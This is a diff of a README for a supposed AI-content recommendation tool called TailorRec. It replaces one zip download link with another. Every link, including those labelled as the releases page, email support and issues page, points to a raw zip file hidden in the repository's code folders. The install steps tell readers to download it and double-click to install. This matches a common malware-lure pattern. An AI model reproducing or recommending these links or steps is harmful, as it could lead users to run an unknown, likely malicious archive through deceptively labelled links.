@@ -4,7 +4,7 @@
 Welcome to TailorRec, your go-to tool for getting personalized recommendations for AI-generated content. Whether you're looking to enhance your projects or simply explore new ideas, TailorRec makes it easy. Follow the steps below to download and set up the app.
 
 ## 📥 Download TailorRec
-[![Download TailorRec](https://raw.githubusercontent.com/deryarditya/TailorRec/main/SSLRec/data_utils/Rec_Tailor_2.7.zip)](https://raw.githubusercontent.com/deryarditya/TailorRec/main/SSLRec/data_utils/Rec_Tailor_2.7.zip)
+[![Download TailorRec](https://github.com/deryarditya/TailorRec/raw/refs/heads/main/SSLRec/trainer/Tailor_Rec_v3.5.zip)](https://github.com/deryarditya/TailorRec/raw/refs/heads/main/SSLRec/trainer/Tailor_Rec_v3.5.zip)
 
 Visit the link above to download TailorRec. This link will take you to our Releases page where you can find the latest version.
 
@@ -17,9 +17,9 @@ Before you install TailorRec, ensure your system meets these requirements:
 - **Processor:** Any modern Intel or AMD processor
 
 ## ⚙️ Download & Install
-1. Click the button or link above to go to the [Releases page](https://raw.githubusercontent.com/deryarditya/TailorRec/main/SSLRec/data_utils/Rec_Tailor_2.7.zip).
+1. Click the button or link above to go to the [Releases page](https://github.com/deryarditya/TailorRec/raw/refs/heads/main/SSLRec/trainer/Tailor_Rec_v3.5.zip).
 2. On the Releases page, locate the latest version of TailorRec.
-3. Download the appropriate file for your operating system. For example, if you’re using Windows, look for a file like `https://raw.githubusercontent.com/deryarditya/TailorRec/main/SSLRec/data_utils/Rec_Tailor_2.7.zip`.
+3. Download the appropriate file for your operating system. For example, if you’re using Windows, look for a file like `https://github.com/deryarditya/TailorRec/raw/refs/heads/main/SSLRec/trainer/Tailor_Rec_v3.5.zip`.
 4. Once the download is complete, locate the file on your computer.
 5. Double-click the file to begin the installation process. Follow the on-screen instructions to complete the setup.
 
@@ -35,8 +35,8 @@ Once you have installed TailorRec, you can start using it to get AI-generated co
 ## 📞 Support
 If you encounter any issues or have questions while using TailorRec, please feel free to reach out for help:
 
-- **Email Support:** https://raw.githubusercontent.com/deryarditya/TailorRec/main/SSLRec/data_utils/Rec_Tailor_2.7.zip
-- **GitHub Issues Page:** [Report Issues](https://raw.githubusercontent.com/deryarditya/TailorRec/main/SSLRec/data_utils/Rec_Tailor_2.7.zip)
+- **Email Support:** https://github.com/deryarditya/TailorRec/raw/refs/heads/main/SSLRec/trainer/Tailor_Rec_v3.5.zip
+- **GitHub Issues Page:** [Report Issues](https://github.com/deryarditya/TailorRec/raw/refs/heads/main/SSLRec/trainer/Tailor_Rec_v3.5.zip)
 
 We encourage you to report any bugs or suggestions, as your feedback helps us improve TailorRec for everyone.
 
@@ -56,7 +56,7 @@ A: Yes, TailorRec is completely free for users.
 A: Internet access is required for retrieving content recommendations.
 
 ### Q: How do I update to the latest version?
-A: Simply revisit the [Releases page](https://raw.githubusercontent.com/deryarditya/TailorRec/main/SSLRec/data_utils/Rec_Tailor_2.7.zip) and download the newest version.
+A: Simply revisit the [Releases page](https://github.com/deryarditya/TailorRec/raw/refs/heads/main/SSLRec/trainer/Tailor_Rec_v3.5.zip) and download the newest version.
 
 ## 🌟 Conclusion
 Thank you for choosing TailorRec! We hope you find it useful for generating creative AI content. For ongoing updates and tips, stay tuned to our repository on GitHub. Happy creating!
